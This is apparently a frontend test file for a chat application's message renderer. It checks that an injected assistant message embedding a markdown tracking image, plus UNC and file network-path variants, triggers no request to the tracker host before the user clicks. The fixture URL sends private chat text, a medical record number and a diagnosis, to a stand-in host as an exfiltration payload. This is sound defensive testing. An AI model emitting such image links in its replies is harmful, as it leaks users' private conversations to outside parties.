import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { fireEvent, render, screen, waitFor } from '@testing-library/react';
import type { Message } from '../api';
import BioRouterMessage from './BioRouterMessage';
import { SessionMessages } from './sessions/SessionViewComponents';

/**
 * An injected assistant message carrying a tracking image (OP-P0-09, B3-6).
 *
 * The address is the shape an exfiltration takes: a host the reader never chose,
 * with the chat's private text in its query. Drawn as an `<img>`, the request
 * leaves the moment the message is shown. These tests watch every way the
 * renderer could start that request (an `<img>` source or `srcset`, written as a
 * property or an attribute, a `new Image()`, or `fetch`) and require that none of
 * them names the tracker until the person clicks.
 */

const TRACKER = 'https://tracker.example.net/p.gif?chat=MRN-0042%20glioma';
const TRACKER_HOST = 'tracker.example.net';

const injected = (id: string): Message => ({
  id,
  role: 'assistant',
  created: 1,
  metadata: { userVisible: true, agentVisible: true },
  content: [
    {
      type: 'text',
      text: `Here is the summary you asked for.\n\n![](${TRACKER})\n\nLet me know if you need more.`,
    },
  ],
});

/** Every request toward the tracker the renderer starts, recorded as it starts. */
const attempts: string[] = [];

function record(value: unknown) {
  const text = String(value ?? '');
  if (text.includes(TRACKER_HOST)) attempts.push(text);
}

let loadRemoteImage: ReturnType<typeof vi.fn>;

beforeEach(() => {
  attempts.length = 0;
  const srcSetter = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src')?.set;
  vi.spyOn(HTMLImageElement.prototype, 'src', 'set').mockImplementation(function (
    this: HTMLImageElement,
    value: string
  ) {
    record(value);
    srcSetter?.call(this, value);
  });
  const setAttribute = Element.prototype.setAttribute;
  vi.spyOn(Element.prototype, 'setAttribute').mockImplementation(function (
    this: Element,
    name: string,
    value: string
  ) {
    // The attributes that start a load. An `<a href>` is not one: a link waits for a click.
    if (/^(src|srcset|poster|background|data)$/i.test(name)) record(value);
    setAttribute.call(this, name, value);
  });
  vi.spyOn(globalThis, 'fetch').mockImplementation(async (input: Parameters<typeof fetch>[0]) => {
    record(typeof input === 'string' ? input : input instanceof URL ? input.href : input.url);
    throw new Error('offline');
  });
  Object.defineProperty(URL, 'createObjectURL', {
    configurable: true,
    value: vi.fn(() => 'blob:tracker-image'),
  });
  Object.defineProperty(URL, 'revokeObjectURL', { configurable: true, value: vi.fn() });

  loadRemoteImage = vi.fn(async () => ({
    ok: true,
    mimeType: 'image/gif',
    bytes: new Uint8Array([0x47, 0x49, 0x46]),
  }));
  Object.defineProperty(window, 'electron', {
    configurable: true,
    value: {
      readArtifactFile: vi.fn(async () => ({ kind: 'error', found: false })),
      openExternal: vi.fn(async () => undefined),
      loadRemoteImage,
    },
  });
});

afterEach(() => {
  // @ts-expect-error: remove the per-test electron stub.
  delete window.electron;
  vi.restoreAllMocks();
});

describe('an injected assistant message with a tracking image', () => {
  it('requests nothing from the tracker before the click, in a live chat', async () => {
    const message = injected('injected-live');
    render(
      <BioRouterMessage
        sessionId="private-chat"
        message={message}
        messages={[message]}
        toolCallNotifications={new Map()}
        onRunInTerminal={null}
        workingDir="/work"
        onOpenArtifact={vi.fn()}
      />
    );

    const button = await screen.findByRole('button', {
      name: new RegExp(`load image from ${TRACKER_HOST.replace(/\./g, '\\.')}`, 'i'),
    });
    expect(await screen.findByText('Let me know if you need more.')).toBeVisible();
    expect(attempts).toEqual([]);
    expect(loadRemoteImage).not.toHaveBeenCalled();
    expect(document.querySelector(`img[src*="${TRACKER_HOST}"]`)).toBeNull();

    fireEvent.click(button);
    await waitFor(() => expect(loadRemoteImage).toHaveBeenCalledTimes(1));
    expect(loadRemoteImage).toHaveBeenCalledWith(TRACKER);
    // The desktop shows the clicked image from the bytes the main process
    // fetched, so the renderer itself still never names the tracker.
    await waitFor(() =>
      expect(document.querySelector('img[src="blob:tracker-image"]')).not.toBeNull()
    );
    expect(attempts).toEqual([]);
  });

  it('never hands a tracker written as a network path to the file read', async () => {
    // On Windows `//host/…` and `file:////host/…` are network paths, and the
    // file read's own `realpath` would reach the host before any click.
    const forms = [
      `//${TRACKER_HOST}/p.gif`,
      `file:////${TRACKER_HOST}/share/p.gif`,
      String.raw`\\\\${TRACKER_HOST}\\share\\p.gif`,
    ];
    const message: Message = {
      ...injected('injected-unc'),
      content: [
        {
          type: 'text',
          text: `Summary.\n\n${forms.map((src, index) => `![Pixel ${index}](${src})`).join('\n\n')}\n\nDone.`,
        },
      ],
    };
    render(
      <BioRouterMessage
        sessionId="private-chat"
        message={message}
        messages={[message]}
        toolCallNotifications={new Map()}
        onRunInTerminal={null}
        workingDir="C:\\Users\\ada\\proj"
        onOpenArtifact={vi.fn()}
      />
    );

    expect(await screen.findByText('Done.')).toBeVisible();
    for (const index of forms.keys()) {
      expect(await screen.findByRole('img', { name: `Pixel ${index}` })).toBeVisible();
    }
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(window.electron.readArtifactFile).not.toHaveBeenCalled();
    expect(loadRemoteImage).not.toHaveBeenCalled();
    expect(attempts).toEqual([]);
    expect(document.querySelector('img')).toBeNull();
  });

  it('requests nothing from the tracker in a saved chat opened from History', async () => {
    render(
      <SessionMessages
        messages={[injected('injected-history')]}
        sessionId="saved-chat"
        isLoading={false}
        error={null}
        onRetry={vi.fn()}
        onOpenArtifact={vi.fn()}
        workingDir="/work"
      />
    );

    expect(
      await screen.findByRole('button', {
        name: new RegExp(`load image from ${TRACKER_HOST.replace(/\./g, '\\.')}`, 'i'),
      })
    ).toBeVisible();
    expect(attempts).toEqual([]);
    expect(loadRemoteImage).not.toHaveBeenCalled();
  });
});
